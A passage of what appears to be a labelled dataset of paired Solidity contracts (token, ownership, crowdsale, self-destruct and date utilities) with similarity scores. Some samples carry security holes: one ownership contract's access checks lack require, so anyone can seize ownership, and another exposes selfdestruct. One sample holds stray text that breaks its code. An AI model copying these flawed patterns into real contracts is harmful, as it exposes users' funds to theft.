    uint internal _totalSupply = 1000;
    mapping (address => uint) internal _balanceOf;
    mapping (address => mapping (address => uint)) internal _allowances;

    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {
        _symbol = symbol;
        _name = name;
        _decimals = decimals;
        _totalSupply = totalSupply;
    }

    function name() public constant returns (string) {
        return _name;
    }

    function symbol() public constant returns (string) {
        return _symbol;
    }

    function decimals() public constant returns (uint8) {
        return _decimals;
    }

    function totalSupply() public constant returns (uint) {
        return _totalSupply;
    }

    function balanceOf(address _addr) public constant returns (uint);
    function transfer(address _to, uint _value) public returns (bool);
    event Transfer(address indexed _from, address indexed _to, uint _value);
}",0.973689631,"contract ERC20Basic {

  string internal _symbol;

  string internal _name;

  uint8 internal _decimals;

  uint internal _totalSupply;

  mapping (address => uint) internal _balanceOf;



  mapping (address => mapping (address => uint)) internal _allowances;



  function ERC20Basic(string symbol, string name, uint8 decimals, uint totalSupply) public {

      _symbol = symbol;

      _name = name;

      _decimals = decimals;

      _totalSupply = totalSupply;

  }



  function name() public constant returns (string) {

      return _name;

  }



  function symbol() public constant returns (string) {

      return _symbol;

  }



  function decimals() public constant returns (uint8) {

      return _decimals;

  }



  function totalSupply() public constant returns (uint) {

      return _totalSupply;

  }

  function balanceOf(address _addr) public constant returns (uint);

  function transfer(address _to, uint _value) public returns (bool);

  event Transfer(address indexed _from, address indexed _to, uint _value);

}",1,,,,,
"contract MyToken {
    
    string public standard = 'Token 0.1';
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function MyToken(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
        ) {
        balanceOf[msg.sender] = initialSupply;              
        totalSupply = initialSupply;                        
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
    }

    
    function transfer(address _to, uint256 _value) {
        if (_to == 0x0) throw;                               
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function approve(address _spender, uint256 _value)
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }        

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (_to == 0x0) throw;                                
        if (balanceOf[_from] < _value) throw;                 
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;  
        if (_value > allowance[_from][msg.sender]) throw;     
        balanceOf[_from] -= _value;                           
        balanceOf[_to] += _value;                             
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    function burn(uint256 _value) returns (bool success) {
        if (balanceOf[msg.sender] < _value) throw;            
        balanceOf[msg.sender] -= _value;                      
        totalSupply -= _value;                                
        Burn(msg.sender, _value);
        return true;
    }

    function burnFrom(address _from, uint256 _value) returns (bool success) {
        if (balanceOf[_from] < _value) throw;                
        if (_value > allowance[_from][msg.sender]) throw;    
        balanceOf[_from] -= _value;                          
        totalSupply -= _value;                               
        Burn(_from, _value);
        return true;
    }
}",0.990291505,"contract PlexCoin {
    
    string public standard = &#39;Token 0.1&#39;;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function PlexCoin(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
        ) {
        balanceOf[msg.sender] = initialSupply;              
        totalSupply = initialSupply;                        
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
    }

    
    function transfer(address _to, uint256 _value) {
        if (_to == 0x0) throw;                               
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function approve(address _spender, uint256 _value)
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }        

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (_to == 0x0) throw;                                
        if (balanceOf[_from] < _value) throw;                 
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;  
        if (_value > allowance[_from][msg.sender]) throw;     
        balanceOf[_from] -= _value;                           
        balanceOf[_to] += _value;                             
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    function burn(uint256 _value) returns (bool success) {
        if (balanceOf[msg.sender] < _value) throw;            
        balanceOf[msg.sender] -= _value;                      
        totalSupply -= _value;                                
        Burn(msg.sender, _value);
        return true;
    }

    function burnFrom(address _from, uint256 _value) returns (bool success) {
        if (balanceOf[_from] < _value) throw;                
        if (_value > allowance[_from][msg.sender]) throw;    
        balanceOf[_from] -= _value;                          
        totalSupply -= _value;                               
        Burn(_from, _value);
        return true;
    }
}",1,,,,,
"contract Ownable {
  address payable public owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  
  constructor (Ownable) public {
    owner  = msg.sender;
  }


  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }


  
  function transferOwnership(address payable newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

}",0.909334967,"contract Ownable {

  address public owner;



  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



  constructor() public {

    owner = 0x1EE6Db67a3e07d6f1f4b72571c0aA9C78500861A;

  }



  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }



  function transferOwnership(address newOwner) public onlyOwner {

    require(newOwner != address(0));

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

  }



}",1,,,,,
"contract greeter is mortal {
    string greeting;

    function greeter(string _greeting) public {
        greeting = _greeting;
    }

    function greet() constant returns(string) {
        return greeting;
    }
}",0.937837318,"contract Greeter is Mortal {
    
    string greeting;

    
    function Greeter(string _greeting) public {
        greeting = _greeting;
    }

    
    function greet() constant returns (string) {
        return greeting;
    }
}",0,,,,,
"contract Crowdsale {
using SafeMath for uint256;


MiniMeToken public token;


uint256 public startTime;
uint256 public endTime;


address public wallet;


uint256 public rate;


uint256 public weiRaised;


event TokenPurchase(address indexed purchaser, address indexed beneficiary, 
uint256 value, uint256 amount);


function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, 
address _wallet, MiniMeToken _token) public {
require(_startTime >= now);
require(_endTime >= _startTime);
require(_rate > 0);
require(_wallet != address(0));
require(_token != address(0));

startTime = _startTime;
endTime = _endTime;
rate = _rate;
wallet = _wallet;
token = _token;
}

 
 function () external payable {
 buyTokens(msg.sender);
 }

 
 function buyTokens(address beneficiary) public payable {
 require(beneficiary != address(0));
 require(validPurchase());

 uint256 weiAmount = msg.value;


uint256 tokens = getTokenAmount(weiAmount);


weiRaised = weiRaised.add(weiAmount);

token.generateTokens(beneficiary, tokens);
TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

forwardFunds();
}


function hasEnded() public view returns (bool) {
return now > endTime;
}


crowdsale when buying
function getTokenAmount(uint256 weiAmount) internal view returns(uint256) {
return weiAmount.mul(rate);
}



function forwardFunds() internal {
wallet.transfer(msg.value);
}


function validPurchase() internal view returns (bool) {
bool withinPeriod = now >= startTime && now <= endTime;
bool nonZeroPurchase = msg.value != 0;
return withinPeriod && nonZeroPurchase;
}

}",0.955678614,"contract Crowdsale {
  using SafeMath for uint256;

  
  MintableToken public token;

  
  uint256 public startTime;
  uint256 public endTime;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) public {
    
    require(_endTime >= _startTime);
    require(_rate > 0);
    require(_wallet != address(0));

    token = createTokenContract();
    startTime = _startTime;
    endTime = _endTime;
    rate = _rate;
    wallet = _wallet;
  }

  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address beneficiary) public payable {
    require(beneficiary != address(0));
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);

    token.mint(beneficiary, tokens);
    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

    forwardFunds();
  }

  
  function hasEnded() public view returns (bool) {
    return now > endTime;
  }

  
  
  function createTokenContract() internal returns (MintableToken) {
    return new MintableToken();
  }

  
  function getTokenAmount(uint256 weiAmount) internal view returns(uint256) {
    return weiAmount.mul(rate);
  }

  
  
  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }

  
  function validPurchase() internal view returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }

}",1,,,,,
"contract Ownable {

 address public owner;

    
  function Ownable() {
    owner = msg.sender;
  }


  
  modifier onlyOwner() {
    (msg.sender == owner);
    _;
  }


  
  function transferOwnership(address newOwner) onlyOwner {
   (newOwner != address(0));      
    owner = newOwner;
  }

}",0.912968812,"contract Ownable {

  address public owner;
  function Ownable() public { owner = msg.sender; }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address newOwner) public onlyOwner {owner = newOwner;}
}",4,,,,,
"contract BasicToken is ERC20Basic {
  using SafeMath for uint;

  mapping(address => uint256) balances;

  
  modifier onlyPayloadSize(uint256 size) {
     require(msg.data.length >= size + 4);
     _;
  }

  
  function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) returns (bool) {
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) constant returns (uint256 balance) {
    return balances[_owner];
  }
}",0.955756469,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  
  modifier onlyPayloadSize(uint numwords) {
      assert(msg.data.length == numwords * 32 + 4);
      _;
  }

  
  function transfer(address _to, uint256 _value) onlyPayloadSize(2) returns (bool) {
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) constant returns (uint256 balance) {
    return balances[_owner];
  }

}",3,,,,,
"contract owned {
      address public owner;

    function owned() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner {
        owner = newOwner;
    }
}",0.978399578,"contract Owned {
	
    address public owner;

	
    function Owned() {
        owner = msg.sender;
    }
	
	
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

	
    function transferOwnership(address newOwner) onlyOwner {
        owner = newOwner;
    }
}",0,,,,,
"contract ERC20Interface {

    string public constant name = ""Udacity Token"";
    string public constant symbol = ""UDC"";
    uint8 public constant decimals = 18;  

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function transfer(address to, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);

}",0.913868518,"contract ERC20Interface {

    function totalSupply() public constant returns (uint);

    function balanceOf(address tokenOwner) public constant returns (uint balance);

    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);

    function transfer(address to, uint tokens) public returns (bool success);

    function approve(address spender, uint tokens) public returns (bool success);

    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    function burn(uint256 _value) public returns (bool success);



    event Burn(address indexed from, uint256 value);

    event Transfer(address indexed from, address indexed to, uint tokens);

    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}",3,,,,,
"contract ExampleToken {
using SafeMath for uint256;

string public constant name = ""ExampleToken"";
string public constant symbol = ""EXT"";
uint8 public constant decimals = 18; 


uint private constant TOTALSUPPLY = 200000000000 * (10**18);


mapping(address => uint256) balances;




mapping(address => mapping (address => uint256)) allowed;


constructor () public {

    
    balances[msg.sender] = TOTALSUPPLY;

    emit Transfer(address(0), msg.sender, TOTALSUPPLY);
}

             


function totalSupply() public pure returns (uint256 _totalSupply) {
    
    _totalSupply = TOTALSUPPLY;
}



function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
}




function transfer(address _to, uint256 _value) public returns (bool success) {
    require(_to != address(0)); 
    require(_value <= balances[msg.sender]); 
    require(_value>0);

    
    balances[msg.sender] = balances[msg.sender].sub(_value); 
    balances[_to] = balances[_to].add(_value); 
    emit Transfer(msg.sender, _to, _value);
    return true;
}




function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
}




function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
}



function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
}



function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
}


function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
        allowed[msg.sender][_spender] = 0;
    } else {
        allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
}

          


event Approval(address indexed _owner, address indexed _spender, uint256 _value);



event Transfer(address indexed _from, address indexed _to, uint256 _value);

}",0.92869485,"contract BlockContract {

    uint256 totalSupply_; 
    string public constant name = ""BlockContract"";
    string public constant symbol = ""BLOCK"";
    uint8 public constant decimals = 18;
    uint256 public constant initialSupply = 100000000*(10**uint256(decimals));

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping (address => uint256) balances; 
    mapping (address => mapping (address => uint256)) allowed;
    
    function totalSupply() public view returns (uint256){
        return totalSupply_;
    }

    function balanceOf(address _owner) public view returns (uint256){
        return balances[_owner];
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
  }

    function transfer(address _to, uint256 _value) public returns (bool ) {
        require(_to != address(0));
        require(balances[msg.sender] >= _value); 
        balances[msg.sender] = balances[msg.sender] - _value; 
        balances[_to] = balances[_to] + _value; 
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]); 
        balances[_from] = balances[_from] - _value; 
        balances[_to] = balances[_to] + _value; 
        allowed[_from][msg.sender] = allowed[_from][msg.sender] - _value; 
        emit Transfer(_from, _to, _value); 
        return true; 
        } 

     function increaseApproval(address _spender, uint _addedValue) public returns (bool) { 
     allowed[msg.sender][_spender] = allowed[msg.sender][_spender] + _addedValue; 
     emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); 
     return true; 
     } 
 
    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { 
    uint oldValue = allowed[msg.sender][_spender]; 
    if (_subtractedValue > oldValue) {

        allowed[msg.sender][_spender] = 0;
    } 
        else {
        allowed[msg.sender][_spender] = oldValue - _subtractedValue;
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
    }

    function BlockContract() public {
        totalSupply_ = initialSupply;
        balances[msg.sender] = initialSupply;
        emit Transfer(0x0, msg.sender, initialSupply);
    }
}",3,*,,,,
"contract ERC20 {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}",0.987238063,"contract ERC20Interface {

    function totalSupply() public constant returns (uint);

    function balanceOf(address tokenOwner) public constant returns (uint balance);

    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);

    function transfer(address to, uint tokens) public returns (bool success);

    function approve(address spender, uint tokens) public returns (bool success);

    function transferFrom(address from, address to, uint tokens) public returns (bool success);



    event Transfer(address indexed from, address indexed to, uint tokens);

    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}",1,,,,,
"contract StandardToken is ERC20  {

  using SafeMath for uint256;

  mapping (address => mapping (address => uint256)) internal allowed;

  mapping(address => uint256) public balances;

  uint256 _totalSupply;

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }

  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

}",0.986155434,"contract StandardToken is ERC20 {

    using SafeMath for uint256;



    mapping(address => uint256) balances;



    mapping (address => mapping (address => uint256)) internal allowed;



    uint256 totalSupply_;



    

    function totalSupply() public view returns (uint256) {

        return totalSupply_;

    }



    

    function balanceOf(address _owner) public view returns (uint256) {

        return balances[_owner];

    }



    

    function allowance(

        address _owner,

        address _spender

    )

      public

      view

      returns (uint256)

    {

        return allowed[_owner][_spender];

    }



    

    function transfer(address _to, uint256 _value) public returns (bool) {

        require(_value <= balances[msg.sender]);

        require(_to != address(0));



        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



    

    function approve(address _spender, uint256 _value) public returns (bool) {

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



    

    function transferFrom(

        address _from,

        address _to,

        uint256 _value

    )

      public

      returns (bool)

    {

        require(_value <= balances[_from]);

        require(_value <= allowed[_from][msg.sender]);

        require(_to != address(0));



        balances[_from] = balances[_from].sub(_value);

        balances[_to] = balances[_to].add(_value);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

        emit Transfer(_from, _to, _value);

        return true;

    }



    

    function increaseApproval(

        address _spender,

        uint256 _addedValue

    )

      public

      returns (bool)

    {

        allowed[msg.sender][_spender] = (

            allowed[msg.sender][_spender].add(_addedValue));

        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

        return true;

    }



    

    function decreaseApproval(

        address _spender,

        uint256 _subtractedValue

    )

      public

      returns (bool)

    {

        uint256 oldValue = allowed[msg.sender][_spender];

        if (_subtractedValue >= oldValue) {

            allowed[msg.sender][_spender] = 0;

        } else {

            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);

        }

        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

        return true;

    }

}",1,,,,,
"contract Owned {
    address public owner; 

    
    modifier onlyOwner () {
        require (msg.sender == owner);
        _;
    }

    
    function owned () public {
        owner = msg.sender;
    }

    
    function changeOwner (address _newOwner) public onlyOwner {
        owner = _newOwner;
    }
}",0.921987677,"contract owned {
    address public owner;

    function owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}",1,,,,,
"contract Mortal is Owned {
        
    function kill () public onlyOwner {
        selfdestruct (owner);
    }
}",0.914816868,"contract Mortal is Ownable {
  function kill() public onlyOwner {
    selfdestruct(owner);
  }
}",1,,,,,
"contract DateTime1 {
        
        struct _DateTime {
                uint16 year;
                uint8 month;
                uint8 day;
                uint8 hour;
                uint8 minute;
                uint8 second;
                uint8 weekday;
        }

        uint constant DAY_IN_SECONDS = 86400;
        uint constant YEAR_IN_SECONDS = 31536000;
        uint constant LEAP_YEAR_IN_SECONDS = 31622400;

        uint constant HOUR_IN_SECONDS = 3600;
        uint constant MINUTE_IN_SECONDS = 60;

        uint16 constant ORIGIN_YEAR = 1970;

        function isLeapYear(uint16 year) public view returns (bool) {
                if (year % 4 != 0) {
                        return false;
                }
                if (year % 100 != 0) {
                        return true;
                }
                if (year % 400 != 0) {
                        return false;
                }
                return true;
        }

        function leapYearsBefore(uint year) public view returns (uint) {
                year -= 1;
                return year / 4 - year / 100 + year / 400;
        }

        function getDaysInMonth(uint8 month, uint16 year) public view returns (uint8) {
                if (month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {
                        return 31;
                }
                else if (month == 4 || month == 6 || month == 9 || month == 11) {
                        return 30;
                }
                else if (isLeapYear(year)) {
                        return 29;
                }
                else {
                        return 28;
                }
        }

        function parseTimestamp(uint timestamp) internal view returns (_DateTime dt) {
                uint secondsAccountedFor = 0;
                uint buf;
                uint8 i;

                
                dt.year = getYear(timestamp);
                buf = leapYearsBefore(dt.year) - leapYearsBefore(ORIGIN_YEAR);

                secondsAccountedFor += LEAP_YEAR_IN_SECONDS * buf;
                secondsAccountedFor += YEAR_IN_SECONDS * (dt.year - ORIGIN_YEAR - buf);

                
                uint secondsInMonth;
                for (i = 1; i <= 12; i++) {
                        secondsInMonth = DAY_IN_SECONDS * getDaysInMonth(i, dt.year);
                        if (secondsInMonth + secondsAccountedFor > timestamp) {
                                dt.month = i;
                                break;
                        }
                        secondsAccountedFor += secondsInMonth;
                }

                
                for (i = 1; i <= getDaysInMonth(dt.month, dt.year); i++) {
                        if (DAY_IN_SECONDS + secondsAccountedFor > timestamp) {
                                dt.day = i;
                                break;
                        }
                        secondsAccountedFor += DAY_IN_SECONDS;
                }

                
                dt.hour = getHour(timestamp);

                
                dt.minute = getMinute(timestamp);

                
                dt.second = getSecond(timestamp);

                
                dt.weekday = getWeekday(timestamp);
        }

        function getYear(uint timestamp) public view returns (uint16) {
                uint secondsAccountedFor = 0;
                uint16 year;
                uint numLeapYears;

                
                year = uint16(ORIGIN_YEAR + timestamp / YEAR_IN_SECONDS);
                numLeapYears = leapYearsBefore(year) - leapYearsBefore(ORIGIN_YEAR);

                secondsAccountedFor += LEAP_YEAR_IN_SECONDS * numLeapYears;
                secondsAccountedFor += YEAR_IN_SECONDS * (year - ORIGIN_YEAR - numLeapYears);

                while (secondsAccountedFor > timestamp) {
                        if (isLeapYear(uint16(year - 1))) {
                                secondsAccountedFor -= LEAP_YEAR_IN_SECONDS;
                        }
                        else {
                                secondsAccountedFor -= YEAR_IN_SECONDS;
                        }
                        year -= 1;
                }
                return year;
        }

        function getMonth(uint timestamp) public view returns (uint8) {
                return parseTimestamp(timestamp).month;
        }

        function getDay(uint timestamp) public view returns (uint8) {
                return parseTimestamp(timestamp).day;
        }

        function getHour(uint timestamp) public view returns (uint8) {
                return uint8((timestamp / 60 / 60) % 24);
        }

        function getMinute(uint timestamp) public view returns (uint8) {
                return uint8((timestamp / 60) % 60);
        }

        function getSecond(uint timestamp) public view returns (uint8) {
                return uint8(timestamp % 60);
        }

        function getWeekday(uint timestamp) public view returns (uint8) {
                return uint8((timestamp / DAY_IN_SECONDS + 4) % 7);
        }

        function toTimestamp(uint16 year, uint8 month, uint8 day) public view returns (uint timestamp) {
                return toTimestamp(year, month, day, 0, 0, 0);
        }

        function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour) public view returns (uint timestamp) {
                return toTimestamp(year, month, day, hour, 0, 0);
        }

        function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute) public view returns (uint timestamp) {
                return toTimestamp(year, month, day, hour, minute, 0);
        }

        function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute, uint8 second) public view returns (uint timestamp) {
                uint16 i;

                
                for (i = ORIGIN_YEAR; i < year; i++) {
                        if (isLeapYear(i)) {
                                timestamp += LEAP_YEAR_IN_SECONDS;
                        }
                        else {
                                timestamp += YEAR_IN_SECONDS;
                        }
                }

                
                uint8[12] memory monthDayCounts;
                monthDayCounts[0] = 31;
                if (isLeapYear(year)) {
                        monthDayCounts[1] = 29;
                }
                else {
                        monthDayCounts[1] = 28;
                }
                monthDayCounts[2] = 31;
                monthDayCounts[3] = 30;
                monthDayCounts[4] = 31;
                monthDayCounts[5] = 30;
                monthDayCounts[6] = 31;
                monthDayCounts[7] = 31;
                monthDayCounts[8] = 30;
                monthDayCounts[9] = 31;
                monthDayCounts[10] = 30;
                monthDayCounts[11] = 31;

                for (i = 1; i < month; i++) {
                        timestamp += DAY_IN_SECONDS * monthDayCounts[i - 1];
                }

                
                timestamp += DAY_IN_SECONDS * (day - 1);

                
                timestamp += HOUR_IN_SECONDS * (hour);

                
                timestamp += MINUTE_IN_SECONDS * (minute);

                
                timestamp += second;

                return timestamp;
        }
    }",0.982341542,"contract DateTime {
    
    struct _DateTime {
        uint16 year;
        uint8 month;
        uint8 day;
        uint8 hour;
        uint8 minute;
        uint8 second;
        uint8 weekday;
    }

    uint constant DAY_IN_SECONDS = 86400;
    uint constant YEAR_IN_SECONDS = 31536000;
    uint constant LEAP_YEAR_IN_SECONDS = 31622400;

    uint constant HOUR_IN_SECONDS = 3600;
    uint constant MINUTE_IN_SECONDS = 60;

    uint16 constant ORIGIN_YEAR = 1970;

    function isLeapYear(uint16 year) public pure returns (bool) {
        if (year % 4 != 0) {
            return false;
        }
        if (year % 100 != 0) {
            return true;
        }
        if (year % 400 != 0) {
            return false;
        }
        return true;
    }

    function leapYearsBefore(uint year) public pure returns (uint) {
        year -= 1;
        return year / 4 - year / 100 + year / 400;
    }

    function getDaysInMonth(uint8 month, uint16 year) public pure returns (uint8) {
        if (month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {
            return 31;
        }
        else if (month == 4 || month == 6 || month == 9 || month == 11) {
            return 30;
        }
        else if (isLeapYear(year)) {
            return 29;
        }
        else {
            return 28;
        }
    }

    function parseTimestamp(uint timestamp) internal pure returns (_DateTime memory dt) {
        uint secondsAccountedFor = 0;
        uint buf;
        uint8 i;

        
        dt.year = getYear(timestamp);
        buf = leapYearsBefore(dt.year) - leapYearsBefore(ORIGIN_YEAR);

        secondsAccountedFor += LEAP_YEAR_IN_SECONDS * buf;
        secondsAccountedFor += YEAR_IN_SECONDS * (dt.year - ORIGIN_YEAR - buf);

        
        uint secondsInMonth;
        for (i = 1; i <= 12; i++) {
            secondsInMonth = DAY_IN_SECONDS * getDaysInMonth(i, dt.year);
            if (secondsInMonth + secondsAccountedFor > timestamp) {
                dt.month = i;
                break;
            }
            secondsAccountedFor += secondsInMonth;
        }

        
        for (i = 1; i <= getDaysInMonth(dt.month, dt.year); i++) {
            if (DAY_IN_SECONDS + secondsAccountedFor > timestamp) {
                dt.day = i;
                break;
            }
            secondsAccountedFor += DAY_IN_SECONDS;
        }

        
        dt.hour = getHour(timestamp);

        
        dt.minute = getMinute(timestamp);

        
        dt.second = getSecond(timestamp);

        
        dt.weekday = getWeekday(timestamp);
    }

    function getYear(uint timestamp) public pure returns (uint16) {
